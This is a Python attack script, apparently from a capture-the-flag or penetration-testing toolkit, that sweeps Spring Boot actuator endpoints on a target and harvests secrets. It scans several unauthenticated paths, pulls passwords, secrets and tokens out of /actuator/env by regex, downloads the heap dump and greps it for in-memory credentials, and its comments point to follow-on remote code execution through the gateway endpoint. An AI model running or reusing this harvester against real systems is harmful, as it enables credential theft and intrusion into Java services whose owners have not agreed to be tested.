#!/usr/bin/env python3
# [REFERENCE] Spring Boot actuator harvest — not a CVE, a surface sweep. Actuator
# leaks are the cheapest Java win: env/credentials, heapdump (flags/secrets in RAM),
# and often the entry point for CVE-2022-22947 (gateway) or envlogback RCE.
# Fingerprint: Java app; probe /actuator and common unauthenticated paths.
# Usage: python3 java-actuator-harvest.py http://TARGET[:port]
import requests, sys, re, urllib3
urllib3.disable_warnings()

BASE = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else "http://localhost"

PATHS = [
    "/actuator", "/actuator/env", "/actuator/heapdump", "/actuator/configprops",
    "/actuator/beans", "/actuator/mappings", "/actuator/health",
    "/admin/env", "/monitor/env", "/management/env",
    "/actuator/gateway/routes",
]

s = requests.Session()
for p in PATHS:
    try:
        r = s.get(BASE + p, verify=False, timeout=15)
        flag = "HIT " if r.status_code == 200 and len(r.content) > 50 else "    "
        print("%s %-28s %s len=%d" % (flag, p, r.status_code, len(r.content)))
    except Exception as e:
        print("    %-28s ERR %s" % (p, str(e)[:80]))

# env: grep credentials + sanitized stars (post-process reveals them via /env POST on
# old boots; on newer ones look at property-source names)
r = s.get(BASE + "/actuator/env", verify=False, timeout=15)
if r.status_code == 200:
    for m in re.findall(r'"(pass\w*|secret\w*|token|key|flag[^"]*)"\s*:\s*"([^"]{0,120})', r.text, re.I):
        print("env-leak:", m)

# heapdump: pull and grep strings for flag/password/secret (JDK serialized heap —
# strings still finds in-memory cleartext)
r = s.get(BASE + "/actuator/heapdump", verify=False, timeout=120, stream=True)
if r.status_code == 200:
    import tempfile, os, subprocess
    fd, path = tempfile.mkstemp(suffix=".hprof"); os.close(fd)
    with open(path, "wb") as f:
        for chunk in r.iter_content(65536):
            f.write(chunk)
    print("heapdump saved:", path, os.path.getsize(path))
    out = subprocess.run(["strings", "-n", "6", path], capture_output=True, text=True).stdout
    seen = set()
    for line in out.splitlines():
        if re.search(r"flag\{|password|secret|token", line, re.I) and line not in seen:
            seen.add(line); print("heap:", line[:160])
            if len(seen) > 40: break
